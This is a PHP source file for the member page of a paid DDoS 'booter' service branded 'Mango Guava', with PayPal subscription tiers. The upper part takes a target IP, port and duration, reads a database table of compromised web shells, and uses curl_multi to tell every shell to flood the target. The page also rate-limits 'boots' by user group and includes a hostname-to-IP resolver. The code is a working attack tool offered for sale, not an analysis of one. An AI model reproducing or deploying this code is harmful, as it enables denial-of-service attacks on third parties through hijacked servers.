<?php

include("config.php");

$un = $_SESSION['username'];

$footer = "";
$referrer = $_GET['action'];
if (isset($_POST['host']) && isset($_POST['port']) && isset($_POST['time']) && isset($_SESSION['username'])){
										
	$konflicthost = str_replace(" ","",$_POST['host']);							
	
	if (!preg_match( "/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/", $konflicthost)) $footer = "<div style='text-align:center; font-weight:bold; font-family:Arial, Helvetica, sans-serif; font-size:18px; color:#FFF; width:100%; height:25px; padding-top:6px; background-color:#CC0000; position:absolute; bottom:0px;'>Host must be a valid IP Address.</div><br />";
	
	else {  		
								
		$konflicttime = intval($_POST['time']);	
		$konflictport = intval($_POST['port']);
	
		$myattacks = $_SESSION['myattacks'];
	
		$myattacks = explode("::",$myattacks);
		$myattacks = explode("--",$myattacks[0]);
	
		if ($konflicthost == $myattacks[0] || time() < ($myattacks[1] + TIME_BETWEEN_BOOTS) && strlen($myattacks[1]) != 0 && strlen($myattacks[0]) != 0) {
		
			$footer = "<div style='text-align:center; font-weight:bold; font-family:Arial, Helvetica, sans-serif; font-size:18px; color:#FFF; width:100%; height:25px; padding-top:6px; background-color:#CC0000; position:absolute; bottom:0px;'>You cannot boot the same host twice, and you cannot boot twice within " . TIME_BETWEEN_BOOTS . " seconds.</div><br />";
		
		} else {
	
			$myattacks = $konflicthost . "--" . time() . "::" . $_SESSION['myattacks'];
			
			mysql_query("UPDATE `users` SET `attacks` = '$myattacks' WHERE `id` = '" . $_SESSION['id'] . "';");
			
			$_SESSION['myattacks'] = $myattacks;
		
			if ($konflicttime > MAX_BOOT_TIME || !is_numeric($konflicttime)) $konflicttime = MAX_BOOT_TIME;		
			if (!is_numeric($konflictport)) $konflictport = 80;								
	                	


			$fullcurl = "?act=phptools&host=" . $konflicthost . "&time=" . $konflicttime . "&port=" . $konflictport;   
			ignore_user_abort(TRUE); 												
	    	$mh = curl_multi_init();									
	    	$handles = array();		
			
			$shells = array();
			$query = mysql_query("SELECT * FROM `shells` WHERE `valid` = 'TRUE';") or die(mysql_error());
			while($row = mysql_fetch_array($query)){
				
				$shells[] = $row['location'];
					
			}
			
			shuffle($shells);	
			$shell_array_max = 0;
			
			switch ($_SESSION['group']) {
			
				case "administrator":
					$shell_array_max = ceil(ADMIN_SHELL_PERCENT * count($shells));
				break;
				case "subscriber":
					$shell_array_max = ceil(SUBSCRIBER_SHELL_PERCENT * count($shells));
				break;
				
			}
			
			for ($i = 0; $i < count($shells); $i++) {
				$ch = curl_init($shells[$i] . $fullcurl); 	
	      	    curl_setopt($ch, CURLOPT_TIMEOUT, 15);         	
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 	
	        	curl_multi_add_handle($mh, $ch);					
	        	$handles[] = $ch;
			}
	
	    	$running = null;											
	    	do { 														
	     	   curl_multi_exec($mh,$running);      						
	     	   usleep(200000); 											
	    	} while ($running > 0);										
	
   		 	foreach($handles as $ch) {
   		       curl_multi_remove_handle($mh, $ch);						
    		} 
    		curl_multi_close($mh);
		
			$footer = "<div style='text-align:center; font-weight:bold; font-family:Arial, Helvetica, sans-serif; font-size:18px; color:#FFF; width:100%; height:25px; padding-top:6px; background-color:#006600; position:absolute; bottom:0px;'>Boot Completed</div><br />";
		
		}
	
	} // End valid IP address
	
}

switch ($_POST['form_type']) {
	case "resolve_ip_form":
		$url = str_replace("http://","",$_POST['u']);
		$footer = "<div style='text-align:center; font-weight:bold; font-family:Arial, Helvetica, sans-serif; font-size:18px; color:#FFF; width:100%; height:25px; padding-top:6px; background-color:#006600; position:absolute; bottom:0px;'>" . gethostbyname($url) . "</div><br />";
	break;
	case "logout_form":
		logout();
	break;
}
		
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title><?php echo BOOTER_NAME . " - Member Home"; ?></title>
<link rel="stylesheet" href="style.css" type="text/css" media="screen" /> 
<script type="text/javascript">
function validate_boot_form() {
	if ("guest" != "<?php echo $_SESSION['group']; ?>") {
		var form = document.getElementById("boot_form");
		var error = false;
		if (form.elements["host"].value.length == 0 || form.elements["time"].value.length == 0 || form.elements["time"].value.length == 0) error = true;
		if (!error)	form.submit();
		else flag_error("Fill in all fields.","boot_error");
	} else {
		alert("Guests cannot use the booter.");	
	}
}
function validate_resolve_form() {
	var form = document.getElementById("resolve_ip_form");
	var error = false;
	if (form.elements["u"].value.length == 0) error = true;
	if (!error)	form.submit();
	else flag_error("Fill in all fields.","resolve_error");
}
function flag_error(c,id) {
	document.getElementById(id).innerHTML = c;
}
</script>
</head>
<body>
<center>
<div id="top">

<a href="member.php"><img class="logo" src="logo.png" /></a>

<div class="tabs">
	<div class="tab" onclick="document.location.href='member.php';">Member Home</div>
	<div class="tab" onclick="document.location.href='ucp.php';">User CP</div>
    <div class="tab" onclick="document.getElementById('logout_form').submit();"><form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" id="logout_form" style="display:inline;"><input type="hidden" name="form_type" value="logout_form" id="logout_form" />Logout</form></div>
</div>

</div>

<div id="placeholder">

	<div id="placeholderL">
		<div class="left">
			<span class="title">Menu:</span>
			<ul class="menu">
				<?php echo left_menu(); ?>
           </ul>
		</div>
	</div>
   
<div id="placeholderR">
<div class="right"><br /><br />

<center><span class="heading_2" style="text-align:center; width:100%;">Purchasing Information</span><br /><br />
<?php
if (isset($un))
{
echo 'Hello Mango Guava Member';
}
else
{
echo 'Hello Guest';
}
?>
<br/>
If you do not have an account, you must <a href="index.php">register</a> first.
To purchase, just select an option and click 'pay now'!<br/>
After purchase, your account will be activated instantly.<br/>
You may need to log out and log back in after purchase though.<br/>
<br />
</div>

<div class="right">

<center><span class="heading_2" style="text-align:center; width:100%;">Pay Now</span><br /><br />
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="UDQTZ8DVBYNA4">
<table>
<tr><td><input type="hidden" name="on0" value="Mango Guava Subscription">Mango Guava Subscription</td></tr><tr><td><select name="os0">
	<option value="1_Week_Subscription">1_Week_Subscription $5.00</option>
	<option value="1_Month_Subscription">1_Month_Subscription $10.00</option>
	<option value="Lifetime_Subscription">Lifetime_Subscription $20.00</option>
</select> </td></tr>
<tr><td><input type="hidden" name="on1" value="Mango Guava Username">Mango Guava Username</td></tr><tr><td><input type="text" name="os1" maxlength="60" value="<?php echo $un; ?>"></td></tr>
</table>
<input type="hidden" name="currency_code" value="USD">
<input type="image" src="https://www.paypalobjects.com/en_AU/i/btn/btn_paynowCC_LG.gif" border="0" name="submit" alt="PayPal — The safer, easier way to pay online.">
<img alt="" border="0" src="https://www.paypalobjects.com/en_AU/i/scr/pixel.gif" width="1" height="1">
</form>



</div>

</div>

<div id="footer"><?php echo footer(); ?></div>

</div>
</center>

<?php echo $footer; ?>

</body>
</html>